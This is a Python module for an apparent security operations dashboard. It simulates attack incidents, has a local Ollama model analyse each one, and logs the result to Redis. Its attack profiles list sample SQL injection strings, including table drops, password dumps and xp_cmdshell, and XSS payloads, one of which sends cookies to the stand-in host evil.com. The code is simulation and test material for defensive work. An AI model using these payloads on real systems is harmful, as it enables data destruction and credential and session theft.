import random
import uuid
import asyncio
import logging
from datetime import datetime
from backend.redis_client import redis_manager
from backend.ai_engine import ollama_engine

logger = logging.getLogger("sirc.simulator")

ATTACK_PROFILES = [
    {
        "type": "SQL Injection",
        "payloads": [
            "'; DROP TABLE users; --",
            "' OR '1'='1' UNION SELECT null, username, password FROM users--",
            "admin' --",
            "1; EXEC xp_cmdshell('net user')--"
        ],
        "ips": ["185.220.101.5", "45.154.255.89", "198.51.100.42", "203.0.113.19"]
    },
    {
        "type": "SSH Brute Force",
        "payloads": [
            "Failed password for root from 192.168.1.105 port 54321 ssh2",
            "Invalid user admin from 198.51.100.12",
            "Maximum authentication attempts exceeded for user 'postgres'"
        ],
        "ips": ["192.168.1.105", "104.244.42.1", "178.62.204.11", "159.65.12.33"]
    },
    {
        "type": "DDoS",
        "payloads": [
            "SYN Flood detected: 145,000 packets/sec on port 443",
            "HTTP GET flood targeting /api/v1/auth/login (12,000 req/min)",
            "UDP Amplification attack (NTP reflection) volume 2.4 Gbps"
        ],
        "ips": ["193.32.162.21", "185.191.171.10", "5.188.62.14", "91.240.118.25"]
    },
    {
        "type": "XSS",
        "payloads": [
            "<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>",
            "\"'><script>alert(1)</script>",
            "<img src=x onerror=prompt(1)>"
        ],
        "ips": ["104.28.19.21", "172.67.182.11", "190.93.245.5"]
    },
    {
        "type": "Credential Stuffing",
        "payloads": [
            "High velocity login attempts across 5,400 distinct user accounts",
            "Password spray detected from ASN 20473 (VeePN VPN)",
            "Session hijacking attempt with forged JWT signature"
        ],
        "ips": ["45.134.26.12", "194.26.29.116", "91.215.85.18"]
    }
]

class AttackSimulator:
    def __init__(self):
        self.running = False
        self.subscribers = []

    def add_subscriber(self, callback):
        self.subscribers.append(callback)

    def remove_subscriber(self, callback):
        if callback in self.subscribers:
            self.subscribers.remove(callback)

    async def broadcast(self, message: dict):
        for callback in self.subscribers:
            try:
                await callback(message)
            except Exception as e:
                logger.error(f"Broadcast error: {e}")

    async def simulate_single(self, attack_type_hint: str = "random") -> dict:
        if attack_type_hint == "random" or not attack_type_hint:
            profile = random.choice(ATTACK_PROFILES)
        else:
            profile = next((p for p in ATTACK_PROFILES if p["type"].lower() == attack_type_hint.lower()), random.choice(ATTACK_PROFILES))

        attack_type = profile["type"]
        payload = random.choice(profile["payloads"])
        source_ip = random.choice(profile["ips"])

        incident_id = f"INC-{uuid.uuid4().hex[:8].upper()}"
        
        # Log detection step
        await self.broadcast({
            "timestamp": datetime.utcnow().isoformat(),
            "level": "INFO",
            "message": f"[{incident_id}] Security probe intercepted {attack_type} from IP {source_ip}"
        })

        # Call AI Engine (Ollama)
        ai_res = await ollama_engine.analyze_incident(attack_type, payload, source_ip)

        await self.broadcast({
            "timestamp": datetime.utcnow().isoformat(),
            "level": "AI",
            "message": f"[{incident_id}] Ollama AI analyzed threat ({ai_res['tokens_used']} tokens, {ai_res['tokens_per_sec']} t/s, {ai_res['processing_time_ms']}ms). Severity: {ai_res['severity']}"
        })

        incident = {
            "id": incident_id,
            "timestamp": datetime.utcnow().isoformat(),
            "source_ip": source_ip,
            "attack_type": attack_type,
            "severity": ai_res["severity"],
            "payload": payload,
            "status": "MITIGATED",
            "ai_analysis": ai_res["analysis"],
            "playbook_action": ai_res["playbook_action"],
            "confidence": ai_res["confidence"],
            "tokens_used": ai_res["tokens_used"],
            "processing_time_ms": ai_res["processing_time_ms"]
        }

        redis_manager.save_incident(incident)
        redis_manager.update_stats(ai_res["tokens_used"], ai_res["processing_time_ms"])

        await self.broadcast({
            "timestamp": datetime.utcnow().isoformat(),
            "level": "SUCCESS",
            "message": f"[{incident_id}] Automated Playbook executed successfully: {ai_res['playbook_action']}"
        })

        return incident

attack_simulator = AttackSimulator()
